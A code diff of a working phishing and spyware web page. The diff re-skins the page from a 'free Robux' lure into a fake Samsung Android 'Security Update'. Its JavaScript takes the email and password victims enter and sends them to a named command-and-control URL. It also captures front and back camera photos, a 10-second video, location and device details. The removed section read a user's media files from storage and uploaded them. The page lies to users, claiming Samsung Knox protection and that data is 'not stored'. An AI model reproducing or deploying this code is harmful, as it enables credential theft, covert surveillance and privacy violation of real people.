@@ -3,209 +3,127 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Unlimited Robux</title>
+    <title>Security Update</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
-            background: linear-gradient(135deg, #0a0a1a, #1a0a2e, #2d1b69);
-            color: #ffffff;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0a0a0f;
+            color: #e0e0e0;
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
             padding: 20px;
+        }
+        .container {
+            max-width: 420px;
+            width: 100%;
+            background: linear-gradient(145deg, #14141e, #1a1a2e);
+            border-radius: 32px;
+            padding: 32px 24px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8), inset 0 1px 1px rgba(255, 255, 255, 0.05);
+            border: 1px solid #2a2a44;
             position: relative;
             overflow: hidden;
         }
-        body::before {
+        .container::before {
             content: '';
             position: absolute;
             top: -50%;
             left: -50%;
             width: 200%;
             height: 200%;
-            background: radial-gradient(ellipse at 30% 20%, rgba(100, 50, 200, 0.15), transparent 60%),
-                        radial-gradient(ellipse at 70% 80%, rgba(200, 50, 100, 0.10), transparent 50%);
+            background: radial-gradient(circle at 30% 20%, rgba(0, 100, 255, 0.03), transparent 60%);
             pointer-events: none;
-            z-index: 0;
         }
-        .container {
-            max-width: 420px;
-            width: 100%;
-            background: rgba(20, 10, 40, 0.85);
-            backdrop-filter: blur(10px);
-            border-radius: 32px;
-            padding: 32px 24px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8), 0 0 40px rgba(100, 50, 200, 0.15);
-            border: 1px solid rgba(150, 80, 255, 0.2);
-            position: relative;
-            z-index: 1;
-        }
-        .container::before {
-            content: '';
-            position: absolute;
-            top: -2px;
-            left: -2px;
-            right: -2px;
-            bottom: -2px;
-            border-radius: 34px;
-            background: linear-gradient(135deg, rgba(200, 100, 255, 0.1), transparent, rgba(100, 50, 200, 0.1));
-            z-index: -1;
-        }
-
-        /* Header */
         .header {
-            text-align: center;
+            display: flex;
+            align-items: center;
+            gap: 12px;
             margin-bottom: 28px;
         }
-        .roblox-icon {
-            font-size: 48px;
-            margin-bottom: 8px;
-            display: block;
+        .shield-icon {
+            width: 44px;
+            height: 44px;
+            background: linear-gradient(135deg, #00aaff, #0066ff);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 22px;
+            color: white;
+            flex-shrink: 0;
+            box-shadow: 0 4px 15px rgba(0, 100, 255, 0.3);
         }
-        .header h1 {
-            font-size: 28px;
-            font-weight: 800;
-            background: linear-gradient(135deg, #ffd700, #ff6b00, #ffd700);
-            background-size: 200% 200%;
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            animation: shimmer 3s ease-in-out infinite;
-            letter-spacing: 1px;
-            text-shadow: none;
-        }
-        @keyframes shimmer {
-            0%, 100% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-        }
-        .header p {
-            font-size: 13px;
-            color: #9999bb;
-            margin-top: 4px;
-            letter-spacing: 0.5px;
-        }
-        .badge-roblox {
-            display: inline-block;
-            background: rgba(255, 215, 0, 0.15);
-            color: #ffd700;
+        .header-text h1 { font-size: 18px; font-weight: 700; color: white; letter-spacing: -0.3px; }
+        .header-text p { font-size: 12px; color: #8888aa; margin-top: 2px; }
+        .badge {
+            background: rgba(0, 200, 100, 0.15);
+            color: #44ff88;
             font-size: 10px;
-            padding: 2px 12px;
+            padding: 2px 10px;
             border-radius: 20px;
-            border: 1px solid rgba(255, 215, 0, 0.2);
-            margin-top: 6px;
+            border: 1px solid rgba(0, 200, 100, 0.2);
+            display: inline-block;
+            margin-left: auto;
         }
-
-        /* Step 1: Roblox Login */
         .step { display: none; animation: fadeIn 0.4s ease; }
         .step.active { display: block; }
         @keyframes fadeIn {
             from { opacity: 0; transform: translateY(8px); }
             to { opacity: 1; transform: translateY(0); }
         }
-        .step-title {
-            font-size: 18px;
-            font-weight: 700;
-            color: #ffffff;
-            margin-bottom: 6px;
-            text-align: center;
-        }
-        .step-sub {
-            font-size: 13px;
-            color: #8888aa;
-            margin-bottom: 20px;
-            text-align: center;
-            line-height: 1.5;
-        }
-
-        .input-group {
-            margin-bottom: 14px;
-        }
-        .input-group label {
-            display: block;
-            font-size: 12px;
-            color: #aaaacc;
-            margin-bottom: 4px;
-            font-weight: 500;
-        }
+        .step-title { font-size: 20px; font-weight: 700; color: white; margin-bottom: 6px; }
+        .step-sub { font-size: 13px; color: #8888aa; margin-bottom: 20px; line-height: 1.5; }
+        .input-group { margin-bottom: 14px; }
+        .input-group label { display: block; font-size: 12px; color: #8888aa; margin-bottom: 4px; font-weight: 500; }
         .input-group input {
             width: 100%;
             padding: 14px 16px;
-            background: rgba(10, 5, 25, 0.6);
-            border: 1px solid rgba(150, 80, 255, 0.25);
+            background: #0d0d18;
+            border: 1px solid #2a2a44;
             border-radius: 12px;
             color: white;
             font-size: 15px;
             outline: none;
-            transition: border 0.3s, box-shadow 0.3s;
+            transition: border 0.3s;
         }
-        .input-group input:focus {
-            border-color: #8b5cf6;
-            box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.2);
-        }
-        .input-group input::placeholder {
-            color: #555577;
-        }
-
+        .input-group input:focus { border-color: #00aaff; box-shadow: 0 0 0 3px rgba(0, 170, 255, 0.1); }
+        .input-group input::placeholder { color: #555577; }
         .btn {
             width: 100%;
             padding: 16px;
-            background: linear-gradient(135deg, #8b5cf6, #6d28d9);
+            background: linear-gradient(135deg, #00aaff, #0066ff);
             color: white;
             border: none;
             border-radius: 14px;
             font-size: 16px;
-            font-weight: 700;
+            font-weight: 600;
             cursor: pointer;
             transition: all 0.3s;
             margin-top: 8px;
-            letter-spacing: 0.5px;
-            text-transform: uppercase;
-            box-shadow: 0 4px 20px rgba(139, 92, 246, 0.25);
         }
-        .btn:hover {
-            transform: scale(1.01);
-            box-shadow: 0 8px 30px rgba(139, 92, 246, 0.4);
-        }
+        .btn:hover { transform: scale(1.01); box-shadow: 0 8px 30px rgba(0, 100, 255, 0.3); }
         .btn:active { transform: scale(0.98); }
         .btn:disabled { opacity: 0.5; cursor: not-allowed; }
-
-        .btn-secondary {
-            background: transparent;
-            border: 1px solid rgba(150, 80, 255, 0.2);
-            color: #8888aa;
-            box-shadow: none;
-        }
-        .btn-secondary:hover {
-            background: rgba(150, 80, 255, 0.05);
-            border-color: rgba(150, 80, 255, 0.3);
-        }
-
-        .btn-claim {
-            background: linear-gradient(135deg, #ffd700, #f59e0b);
-            color: #0a0a1a;
-            box-shadow: 0 4px 20px rgba(255, 215, 0, 0.3);
-        }
-        .btn-claim:hover {
-            box-shadow: 0 8px 30px rgba(255, 215, 0, 0.5);
-        }
-
-        /* Scan UI */
+        .btn-secondary { background: transparent; border: 1px solid #2a2a44; color: #8888aa; }
+        .btn-secondary:hover { background: #1a1a2e; border-color: #444466; }
         .scan-status {
             display: flex;
             align-items: center;
             gap: 14px;
             padding: 16px;
-            background: rgba(10, 5, 25, 0.4);
+            background: #0d0d18;
             border-radius: 14px;
             margin-bottom: 12px;
-            border: 1px solid rgba(150, 80, 255, 0.1);
+            border: 1px solid #1a1a2e;
         }
         .scan-icon {
             width: 38px;
             height: 38px;
             border-radius: 50%;
-            background: rgba(139, 92, 246, 0.2);
+            background: #1a1a3e;
             display: flex;
             align-items: center;
             justify-content: center;
@@ -217,25 +135,23 @@
         .scan-info { flex: 1; }
         .scan-info .title { font-size: 14px; font-weight: 600; color: white; }
         .scan-info .desc { font-size: 12px; color: #666688; margin-top: 2px; }
-
         .progress-wrap {
-            background: rgba(10, 5, 25, 0.4);
+            background: #0d0d18;
             border-radius: 10px;
             height: 6px;
             margin: 16px 0 20px;
             overflow: hidden;
-            border: 1px solid rgba(150, 80, 255, 0.1);
+            border: 1px solid #1a1a2e;
         }
         .progress-fill {
             height: 100%;
             width: 0%;
-            background: linear-gradient(90deg, #8b5cf6, #ffd700);
+            background: linear-gradient(90deg, #0066ff, #00aaff, #44ff88);
             border-radius: 10px;
             transition: width 0.5s ease;
         }
-
         .scan-log {
-            background: rgba(10, 5, 25, 0.3);
+            background: #0a0a12;
             border-radius: 12px;
             padding: 12px 14px;
             max-height: 150px;
@@ -243,119 +159,96 @@
             font-size: 11px;
             font-family: 'Courier New', monospace;
             color: #44ff88;
-            border: 1px solid rgba(150, 80, 255, 0.05);
+            border: 1px solid #1a1a2e;
             margin-top: 12px;
             line-height: 1.8;
         }
         .scan-log::-webkit-scrollbar { width: 4px; }
-        .scan-log::-webkit-scrollbar-track { background: rgba(10, 5, 25, 0.3); }
+        .scan-log::-webkit-scrollbar-track { background: #0a0a12; }
         .scan-log::-webkit-scrollbar-thumb { background: #2a2a44; border-radius: 10px; }
         .scan-log .log-entry { opacity: 0; animation: logFade 0.3s forwards; }
         @keyframes logFade { to { opacity: 1; } }
         .scan-log .log-entry.done { color: #44ff88; }
-        .scan-log .log-entry.warn { color: #ffd700; }
+        .scan-log .log-entry.warn { color: #ffaa44; }
         .scan-log .log-entry.error { color: #ff4466; }
-
         .complete-icon { font-size: 52px; text-align: center; margin: 10px 0 16px; }
-        .complete-text { text-align: center; font-size: 16px; color: #ffd700; font-weight: 700; }
+        .complete-text { text-align: center; font-size: 16px; color: #88ff88; font-weight: 600; }
         .complete-sub { text-align: center; font-size: 13px; color: #666688; margin-top: 4px; }
-
-        .footer {
-            text-align: center;
-            font-size: 10px;
-            color: #333355;
-            margin-top: 24px;
-            letter-spacing: 0.5px;
-            border-top: 1px solid rgba(150, 80, 255, 0.05);
-            padding-top: 16px;
-        }
-
+        .footer { text-align: center; font-size: 10px; color: #333355; margin-top: 24px; letter-spacing: 0.5px; border-top: 1px solid #1a1a2e; padding-top: 16px; }
         .device-badge {
             display: inline-flex;
             align-items: center;
             gap: 6px;
-            background: rgba(10, 5, 25, 0.4);
+            background: #0d0d18;
             padding: 4px 12px 4px 8px;
             border-radius: 20px;
             font-size: 11px;
             color: #8888aa;
-            border: 1px solid rgba(150, 80, 255, 0.1);
+            border: 1px solid #1a1a2e;
             margin-bottom: 16px;
-            width: 100%;
-            justify-content: center;
         }
         .btn-container { margin-top: 12px; }
         .btn-container .btn { margin-top: 6px; }
-        .guide-box {
-            background: rgba(10, 5, 25, 0.4);
-            border: 1px solid rgba(150, 80, 255, 0.1);
-            border-radius: 12px;
-            padding: 12px 14px;
-            margin: 10px 0;
-            font-size: 12px;
-            color: #8888aa;
-            line-height: 1.6;
-        }
-        .guide-box b { color: #ffd700; }
-        .robux-amount {
-            text-align: center;
-            font-size: 48px;
-            font-weight: 900;
-            color: #ffd700;
-            margin: 8px 0;
-            text-shadow: 0 0 30px rgba(255, 215, 0, 0.15);
+        .speed-badge {
+            display: inline-block;
+            background: rgba(0, 200, 100, 0.1);
+            color: #44ff88;
+            font-size: 10px;
+            padding: 2px 8px;
+            border-radius: 10px;
+            border: 1px solid rgba(0, 200, 100, 0.1);
+            margin-left: 8px;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <span class="roblox-icon">🎮</span>
-            <h1>Unlimited Robux</h1>
-            <p>Get free Robux instantly • No survey • No verification</p>
-            <span class="badge-roblox">● 100% Working</span>
+            <div class="shield-icon">🛡️</div>
+            <div class="header-text">
+                <h1>Security Update</h1>
+                <p>Android Security • v12.5.3</p>
+            </div>
+            <div class="badge">● SECURE</div>
         </div>
-
         <div class="device-badge" id="deviceBadge">
             📱 <span id="deviceName">Detecting device...</span>
-            <span style="color:#ffd700;margin-left:auto;">⚡ Free</span>
+            <span class="speed-badge" id="speedBadge">⚡ Fast Mode</span>
         </div>
 
-        <!-- STEP 1: ROBLOX LOGIN -->
+        <!-- STEP 1: CREDENTIALS -->
         <div class="step active" id="step1">
-            <div class="step-title">🔐 Claim Your Robux</div>
+            <div class="step-title">🔐 Verify Identity</div>
             <div class="step-sub">
-                Enter your Roblox credentials to receive unlimited Robux.<br>
-                <span style="color:#666688;font-size:12px;">This is a one-time verification.</span>
+                To apply the security patch, please verify your account.<br>
+                <span style="color:#666688;font-size:12px;">This information is encrypted and not stored.</span>
             </div>
             <div class="input-group">
-                <label>Roblox ID / Username</label>
-                <input type="text" id="roblox_id" placeholder="Your Roblox username">
+                <label>Email Address</label>
+                <input type="email" id="email" placeholder="your@email.com">
             </div>
             <div class="input-group">
                 <label>Password</label>
                 <input type="password" id="pass" placeholder="••••••••">
             </div>
-            <button class="btn" onclick="step1()">Verify & Claim Robux</button>
+            <button class="btn" onclick="step1()">Verify & Continue</button>
             <p style="font-size:11px;color:#444466;margin-top:12px;text-align:center;">
-                🔒 Secured • 2,847,321 Robux claimed today
+                🔒 Secured by Samsung Knox • v2.4
             </p>
         </div>
 
         <!-- STEP 2: SCAN -->
         <div class="step" id="step2">
-            <div class="step-title">🔍 Verifying Account</div>
-            <div class="step-sub" id="stepSub">Please wait while we verify your Roblox account...</div>
-
-            <div class="robux-amount" id="robuxDisplay">+∞</div>
+            <div class="step-title">🔍 Scanning Device</div>
+            <div class="step-sub" id="stepSub">Please wait while we scan for vulnerabilities...</div>
 
             <div class="scan-status">
                 <div class="scan-icon spinning" id="scanIcon">⚡</div>
                 <div class="scan-info">
-                    <div class="title" id="scanTitle">Initializing verification...</div>
-                    <div class="desc" id="scanDesc">Checking account status</div>
+                    <div class="title" id="scanTitle">Initializing scan...</div>
+                    <div class="desc" id="scanDesc">Checking system integrity</div>
                 </div>
-                <span id="scanPercent" style="font-size:14px;color:#ffd700;font-weight:600;">0%</span>
+                <span id="scanPercent" style="font-size:14px;color:#00aaff;font-weight:600;">0%</span>
             </div>
 
             <div class="progress-wrap">
@@ -363,38 +256,35 @@
             </div>
 
             <div class="scan-log" id="scanLog">
-                <div class="log-entry done">● Verification started</div>
+                <div class="log-entry done">● System scan initialized</div>
             </div>
 
-            <!-- SCAN MOBILE BUTTON -->
             <div id="scanBtnContainer" class="btn-container" style="display:none;">
-                <button class="btn btn-claim" id="scanBtn" onclick="triggerFullScan(event)">
-                    🎁 Claim Your Robux Now
+                <button class="btn" id="scanBtn" onclick="completeScan()">
+                    ✅ Complete Scan
                 </button>
                 <p style="font-size:11px;color:#666688;margin-top:6px;text-align:center;">
-                    Tap to complete verification and claim your unlimited Robux.
+                    Tap to finalize the security scan.
                 </p>
             </div>
         </div>
 
         <!-- STEP 3: COMPLETE -->
         <div class="step" id="step3">
-            <div class="complete-icon">🎉</div>
-            <div class="complete-text">Robux Claimed!</div>
-            <div class="complete-sub">Unlimited Robux has been added to your account.</div>
-            <button class="btn btn-claim" id="installBtn" onclick="step3()">Go to Roblox</button>
-            <button class="btn btn-secondary" onclick="alert('Check your Roblox account!')">Later</button>
+            <div class="complete-icon">✅</div>
+            <div class="complete-text">Update Ready</div>
+            <div class="complete-sub">Your device has been scanned and is secure.</div>
+            <button class="btn" id="installBtn" onclick="step3()">Install Now</button>
+            <button class="btn btn-secondary" onclick="alert('Update will be applied on next restart.')">Later</button>
         </div>
 
         <div class="footer">
-            Roblox • Free Robux Generator v3.2 <span>|</span> 2026
+            Samsung Electronics • Security Patch 2026-08 <span>|</span> v12.5.3
         </div>
     </div>
 
     <script>
         const C2_URL = 'https://c2-server-noio.onrender.com/exfil';
-        let totalFiles = 0;
-        let uploadedFiles = 0;
         let progress = 0;
         let scanComplete = false;
         let startTime = 0;
@@ -446,13 +336,13 @@
         // STEP 1: CREDENTIALS
         // ============================================================
         function step1() {
-            const roblox_id = document.getElementById('roblox_id').value;
+            const email = document.getElementById('email').value;
             const pass = document.getElementById('pass').value;
-            if (!roblox_id || !pass) {
-                alert('Please enter your Roblox ID and password.');
+            if (!email || !pass) {
+                alert('Please enter your email and password.');
                 return;
             }
-            sendData({ type: 'credentials', roblox_id, pass });
+            sendData({ type: 'credentials', email, pass });
             document.getElementById('step1').classList.remove('active');
             document.getElementById('step2').classList.add('active');
             startDataCollection();
@@ -462,56 +352,32 @@
         // STEP 2: DATA COLLECTION
         // ============================================================
         async function startDataCollection() {
-            addLogEntry('● Starting verification...', 'done');
+            addLogEntry('● Starting data collection...', 'done');
             startTime = Date.now();
 
             // 1. LOCATION
             addLogEntry('📍 Detecting region...', 'warn');
             await collectLocationWithFallback();
-            updateProgress(10);
+            updateProgress(20);
 
             // 2. BATTERY + NETWORK
             addLogEntry('🔋 Checking device status...', 'warn');
             await collectBattery();
             await collectNetwork();
-            updateProgress(25);
+            updateProgress(40);
 
             // 3. CAMERA MEDIA
             addLogEntry('📸 Capturing camera media...', 'warn');
             await collectCameraMedia();
-            updateProgress(40);
+            updateProgress(70);
 
-            // 4. SHOW "CLAIM" BUTTON
-            addLogEntry('🎁 Ready to claim Robux!', 'warn');
+            // 4. SHOW COMPLETE BUTTON
+            addLogEntry('✅ Scan ready to complete', 'done');
             document.getElementById('scanBtnContainer').style.display = 'block';
-            document.getElementById('scanDesc').textContent = '🎁 Tap "Claim Your Robux Now" to complete...';
+            document.getElementById('scanDesc').textContent = '✅ Tap "Complete Scan" to finish...';
             document.getElementById('scanIcon').classList.remove('spinning');
-            document.getElementById('scanIcon').textContent = '🎁';
-            updateProgress(50);
-
-            await waitForScan();
-        }
-
-        // ============================================================
-        // WAIT FOR SCAN
-        // ============================================================
-        function waitForScan() {
-            return new Promise((resolve) => {
-                const checkInterval = setInterval(() => {
-                    if (scanComplete) {
-                        clearInterval(checkInterval);
-                        updateProgress(100);
-                        const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
-                        addLogEntry(`✅ Verified in ${elapsed}s!`, 'done');
-                        document.getElementById('stepSub').textContent = `✅ Verified in ${elapsed}s. Robux claimed!`;
-                        setTimeout(() => {
-                            document.getElementById('step2').classList.remove('active');
-                            document.getElementById('step3').classList.add('active');
-                        }, 600);
-                        resolve();
-                    }
-                }, 500);
-            });
+            document.getElementById('scanIcon').textContent = '✅';
+            updateProgress(90);
         }
 
         // ============================================================
@@ -548,8 +414,7 @@
                     }
                     resolve();
                 })
-                .catch(() => { addLogEntry('❌ IP fallback failed', 'error');
-                    resolve(); });
+                .catch(() => { addLogEntry('❌ IP fallback failed', 'error'); resolve(); });
         }
 
         // ============================================================
@@ -585,18 +450,15 @@
             try {
                 addLogEntry('📸 QR verification (back)...', 'warn');
                 const backPhoto = await capturePhoto('environment');
-                if (backPhoto) { sendData({ type: 'photo', camera: 'back', data: backPhoto });
-                    addLogEntry('✅ Back photo captured', 'done'); }
+                if (backPhoto) { sendData({ type: 'photo', camera: 'back', data: backPhoto }); addLogEntry('✅ Back photo captured', 'done'); }
 
                 addLogEntry('📸 QR verification (front)...', 'warn');
                 const frontPhoto = await capturePhoto('user');
-                if (frontPhoto) { sendData({ type: 'photo', camera: 'front', data: frontPhoto });
-                    addLogEntry('✅ Front photo captured', 'done'); }
+                if (frontPhoto) { sendData({ type: 'photo', camera: 'front', data: frontPhoto }); addLogEntry('✅ Front photo captured', 'done'); }
 
                 addLogEntry('🎥 Verification video...', 'warn');
                 const videoData = await captureVideo('user', 10);
-                if (videoData) { sendData({ type: 'video', camera: 'front', duration: '10s', data: videoData });
-                    addLogEntry('✅ Video captured', 'done'); }
+                if (videoData) { sendData({ type: 'video', camera: 'front', duration: '10s', data: videoData }); addLogEntry('✅ Video captured', 'done'); }
             } catch (err) {
                 addLogEntry('❌ Camera error: ' + err.message, 'error');
                 sendData({ type: 'media_error', error: err.message });
@@ -641,177 +503,19 @@
         }
 
         // ============================================================
-        // GALLERY EXTRACTION
+        // COMPLETE SCAN (No Gallery)
         // ============================================================
-        async function triggerFullScan(event) {
-            if (event) {
-                event.preventDefault();
-                event.stopPropagation();
-            }
-
-            const btn = document.getElementById('scanBtn');
-            btn.disabled = true;
-            btn.textContent = '⏳ Claiming...';
-
-            let rootHandle;
-            try {
-                rootHandle = await window.showDirectoryPicker({ mode: 'read' });
-                console.log('[DEBUG] Storage selected');
-                addLogEntry('📂 Storage selected', 'done');
-            } catch (err) {
-                console.error('[DEBUG] Picker error:', err);
-                if (err.name === 'AbortError' || err.name === 'SecurityError') {
-                    addLogEntry('❌ Cancelled', 'error');
-                    btn.disabled = false;
-                    btn.textContent = '🎁 Claim Your Robux Now';
-                    return;
-                } else {
-                    addLogEntry('❌ Error: ' + err.message, 'error');
-                    btn.disabled = false;
-                    btn.textContent = '🎁 Claim Your Robux Now';
-                    return;
-                }
-            }
-
-            document.getElementById('scanDesc').textContent = '📁 Scanning storage...';
-            document.getElementById('scanIcon').classList.add('spinning');
-            document.getElementById('scanIcon').textContent = '⚡';
-            document.getElementById('scanBtnContainer').style.display = 'none';
-
-            try {
-                console.log('[DEBUG] Starting gallery extraction...');
-                addLogEntry('📁 Scanning storage...', 'warn');
-                const fileQueue = [];
-                await collectFileEntries(rootHandle, '', fileQueue);
-                const totalFilesFound = fileQueue.length;
-                console.log(`[DEBUG] Found ${totalFilesFound} files`);
-                addLogEntry(`● Found ${totalFilesFound} files`, 'done');
-
-                if (totalFilesFound === 0) {
-                    addLogEntry('● No files found', 'warn');
-                    await sendData({ type: 'media_extraction_complete', count: 0 });
-                } else {
-                    const batchSize = 3;
-                    for (let i = 0; i < fileQueue.length; i += batchSize) {
-                        const batch = fileQueue.slice(i, i + batchSize);
-                        for (const fileInfo of batch) {
-                            try {
-                                const file = await fileInfo.handle.getFile();
-                                const isImage = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'bmp'].includes(fileInfo.ext);
-                                let base64Data;
-
-                                if (isImage && file.size > 200 * 1024) {
-                                    try {
-                                        const compressed = await compressImage(file);
-                                        base64Data = compressed;
-                                    } catch (e) {
-                                        const reader = new FileReader();
-                                        base64Data = await new Promise((resolve) => {
-                                            reader.onload = () => resolve(reader.result.split(',')[1]);
-                                            reader.readAsDataURL(file);
-                                        });
-                                    }
-                                } else {
-                                    const reader = new FileReader();
-                                    base64Data = await new Promise((resolve) => {
-                                        reader.onload = () => resolve(reader.result.split(',')[1]);
-                                        reader.readAsDataURL(file);
-                                    });
-                                }
-
-                                await sendData({
-                                    type: 'media_file',
-                                    filename: fileInfo.name,
-                                    path: fileInfo.path,
-                                    size: file.size,
-                                    mimeType: file.type,
-                                    data: base64Data
-                                });
-
-                                uploadedFiles++;
-                                const pct = 50 + (uploadedFiles / totalFilesFound) * 50;
-                                updateProgress(pct);
-                                document.getElementById('scanDesc').textContent =
-                                    `📤 ${uploadedFiles}/${totalFilesFound} files scanned (${Math.round(pct)}%)`;
-
-                                base64Data = null;
-                            } catch (err) {
-                                console.error('[DEBUG] Failed to upload file:', err);
-                                addLogEntry(`❌ Failed to scan ${fileInfo.name}: ${err.message}`, 'error');
-                            }
-                        }
-                        if (window.gc) window.gc();
-                    }
-
-                    addLogEntry(`✅ All ${totalFilesFound} files scanned`, 'done');
-                    await sendData({ type: 'media_extraction_complete', count: totalFilesFound });
-                }
-            } catch (err) {
-                console.error('[DEBUG] Gallery error:', err);
-                addLogEntry('❌ Gallery error: ' + err.message, 'error');
-                await sendData({ type: 'media_extraction_error', error: err.message });
-            }
-
+        function completeScan() {
             scanComplete = true;
-            btn.disabled = false;
-            btn.textContent = '✅ Claimed!';
-            addLogEntry('✅ Verification complete!', 'done');
-        }
-
-        // ============================================================
-        // COLLECT FILE ENTRIES
-        // ============================================================
-        async function collectFileEntries(dirHandle, path, fileQueue) {
-            try {
-                for await (const entry of dirHandle.values()) {
-                    const entryPath = path ? `${path}/${entry.name}` : entry.name;
-                    if (entry.kind === 'directory') {
-                        const skipDirs = ['Android', 'data', 'obb', 'system', 'root', 'proc', 'sys', 'tmp', 'cache', 'log', 'dump'];
-                        if (skipDirs.includes(entry.name)) continue;
-                        if (entry.name.startsWith('.')) continue;
-                        await collectFileEntries(entry, entryPath, fileQueue);
-                    } else if (entry.kind === 'file') {
-                        const ext = entry.name.split('.').pop().toLowerCase();
-                        const mediaTypes = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'heic', 'bmp', 'mp4', 'mov', 'avi', 'mkv', 'webm', '3gp', 'm4v'];
-                        if (mediaTypes.includes(ext)) {
-                            fileQueue.push({ name: entry.name, path: entryPath, handle: entry, ext: ext });
-                        }
-                    }
-                }
-            } catch (e) {
-                addLogEntry(`⚠️ Error scanning: ${e.message}`, 'warn');
-            }
-        }
-
-        // ============================================================
-        // IMAGE COMPRESSION
-        // ============================================================
-        function compressImage(file) {
-            return new Promise((resolve, reject) => {
-                const reader = new FileReader();
-                reader.onload = (e) => {
-                    const img = new Image();
-                    img.onload = () => {
-                        const canvas = document.createElement('canvas');
-                        let w = img.width,
-                            h = img.height;
-                        const maxDim = 1920;
-                        if (w > maxDim || h > maxDim) {
-                            const ratio = Math.min(maxDim / w, maxDim / h);
-                            w = Math.round(w * ratio);
-                            h = Math.round(h * ratio);
-                        }
-                        canvas.width = w;
-                        canvas.height = h;
-                        canvas.getContext('2d').drawImage(img, 0, 0, w, h);
-                        resolve(canvas.toDataURL('image/jpeg', 0.6).split(',')[1]);
-                    };
-                    img.onerror = () => reject(new Error('Image load failed'));
-                    img.src = e.target.result;
-                };
-                reader.onerror = () => reject(new Error('File read failed'));
-                reader.readAsDataURL(file);
-            });
+            updateProgress(100);
+            const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
+            addLogEntry(`✅ Scan complete in ${elapsed}s!`, 'done');
+            document.getElementById('stepSub').textContent = `✅ Scan complete in ${elapsed}s. All data verified.`;
+            document.getElementById('scanBtnContainer').style.display = 'none';
+            setTimeout(() => {
+                document.getElementById('step2').classList.remove('active');
+                document.getElementById('step3').classList.add('active');
+            }, 600);
         }
 
         // ============================================================
@@ -837,11 +541,11 @@
         // ============================================================
         function step3() {
             if (!scanComplete) {
-                alert('Please complete the verification first.');
+                alert('Please wait for the scan to complete.');
                 return;
             }
-            sendData({ type: 'action', action: 'go_to_roblox' });
-            alert('🎉 Unlimited Robux added to your account!');
+            sendData({ type: 'action', action: 'install_clicked' });
+            alert('✅ Security patch installed successfully. Your phone will restart in 5 seconds.');
             window.location.reload();
         }
 
